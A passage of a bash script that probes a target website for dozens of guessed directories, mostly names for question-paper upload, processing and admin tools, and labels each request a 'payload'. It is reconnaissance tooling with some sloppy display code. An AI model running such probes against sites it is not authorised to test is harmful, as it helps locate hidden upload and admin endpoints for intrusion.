code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystemAutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystemAutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlDashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlDashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MgmtQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MgmtQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUploadQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUploadQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline-QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline-QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PanelQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PanelQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUploadQPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUploadQPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystemMassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystemMassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["OpsQPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"OpsQPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterDataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterDataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUploadQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUploadQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ToolTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ToolTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
